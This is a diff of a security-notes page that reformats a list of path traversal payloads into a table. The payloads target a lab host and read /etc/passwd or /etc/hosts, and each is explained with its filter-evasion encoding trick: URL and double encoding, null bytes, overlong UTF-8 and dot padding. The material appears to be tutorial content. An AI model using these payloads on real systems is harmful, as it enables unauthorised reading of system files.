@@ -153,54 +153,18 @@ Using the url `http://mysite.thm/test.php?path=<path_goes_here>` I am going to g
 
 Here are some basic payloads that can be tried:
 
-### `http://mysite.thm/test.php?path=../../../../etc/passwd`
-
-This is the baseline example to show what a basic attack looks like. The slashes and dots are not encoded. If this works, I can promise that the website was not built with security in mind.
-
-### `http://mysite.thm/test.php?path=..//..//..//etc/passwd`
-
-This payload was mentioned in the [PHP Filter Convert Base64 Encode](#php-filter-convert-base64-encode) section earlier on this page. The double forward slash (//) becomes a single forward slash.
-
-### `http://mysite.thm/test.php?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd`
-
-This payload is used to get around filtering checks that are looking for a forward slash (or two dots before a forward slash) in the url. The interesting part is that `%2F` or `%2f` are the url encoded version of a forward slash. So this path resolves from `..%2F` to `../`.
-
-### `http://mysite.thm/test.php?path=..%252F..%252F..%252F..%252Fetc%252Fpasswd`
-
-This is the same as the previous, the `%` has been url encoded. It is a double encoding example.
-
-### `http://mysite.thm/test.php?path=.%2E/.%2E/.%2E/etc/passwd`
-
-This payload is fantastic to get around filtering checks that are looking for a double period in the url. The interesting part is that `%2E` or `%2e` are the url encoded version of a period. So this path resolves from `.%2E/` to `../`.
-
-### `http://mysite.thm/test.php?path=.%%32%65/.%%32%65/.%%32%65/etc/passwd`
-
-This is the same as the previous example except it url encoded `%2E` to become `%%32%65`. Depending on how things are filtered, this can resolve to a period.
-
-### `http://mysite.thm/test.php?path=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`
-
-This is a full encoding of both the periods and the forward slashes.
-
-### `http://mysite.thm/test.php?path=%C0%AE%C0%AE%2F%C0%AE%C0%AE%2F%C0%AE%C0%AE%2F%C0%AE%C0%AE%2Fetc%2Fpasswd`
-
-Overlong UTF-8 encoding.
-
-### `http://mysite.thm/test.php?path=../../../../etc/passwd%00`
-
-The `%00` character is a null byte character and it ends a string. This would work for misconfigured servers and PHP <5.4 servers.
-
-### `http://mysite.thm/test.php?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd%00`
-
-Same as the above but with url encoding for the forward slash.
-
-### `http://mysite.thm/test.php?path=..\\..\\..\\..\\etc\\hosts`
-
-For Windows targets or ones that did a poor job with input sanitation.
-
-### `http://mysite.thm/test.php?path=....//....//....//....//etc/passwd`
-
-This is called dot padding and it can bypass some naive regex checks.
-
-### `http://mysite.thm/test.php?path=\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd`
-
-This uses Unicode escapes.
+| Payload | Explaination |
+| --- | --- |
+| `http://mysite.thm/test.php?path=../../../../etc/passwd` | This is the baseline example to show what a basic attack looks like. The slashes and dots are not encoded. If this works, I can promise that the website was not built with security in mind. |
+| `http://mysite.thm/test.php?path=..//..//..//etc/passwd` | This payload was mentioned in the [PHP Filter Convert Base64 Encode](#php-filter-convert-base64-encode) section earlier on this page. The double forward slash (`//`) becomes a single forward slash. |
+| `http://mysite.thm/test.php?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd` | This payload is used to get around filtering checks that are looking for a forward slash (or two dots before a forward slash) in the url. The interesting part is that `%2F` or `%2f` are the url encoded version of a forward slash. So this path resolves from `..%2F` to `../`. |
+| `http://mysite.thm/test.php?path=..%252F..%252F..%252F..%252Fetc%252Fpasswd` | This is the same as the previous, the `%` has been url encoded. It is a double encoding example. |
+| `http://mysite.thm/test.php?path=.%2E/.%2E/.%2E/etc/passwd` | This payload is fantastic to get around filtering checks that are looking for a double period in the url. The interesting part is that `%2E` or `%2e` are the url encoded version of a period. So this path resolves from `.%2E/` to `../`. |
+| `http://mysite.thm/test.php?path=.%%32%65/.%%32%65/.%%32%65/etc/passwd` | This is the same as the previous example except it url encoded `%2E` to become `%%32%65`. Depending on how things are filtered, this can resolve to a period. |
+| `http://mysite.thm/test.php?path=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd` | This is a full encoding of both the periods and the forward slashes. |
+| `http://mysite.thm/test.php?path=%C0%AE%C0%AE%2F%C0%AE%C0%AE%2F%C0%AE%C0%AE%2F%C0%AE%C0%AE%2Fetc%2Fpasswd` | Overlong UTF-8 encoding. |
+| `http://mysite.thm/test.php?path=../../../../etc/passwd%00` | The `%00` character is a null byte character and it ends a string. This would work for misconfigured servers and PHP <5.4 servers. |
+| `http://mysite.thm/test.php?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd%00` | Same as the above but with url encoding for the forward slash. |
+| `http://mysite.thm/test.php?path=..\\..\\..\\..\\etc\\hosts` | For Windows targets or ones that did a poor job with input sanitation. |
+| `http://mysite.thm/test.php?path=....//....//....//....//etc/passwd` | This is called dot padding and it can bypass some naive regex checks. |
+| `http://mysite.thm/test.php?path=\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd` | This uses Unicode escapes. |
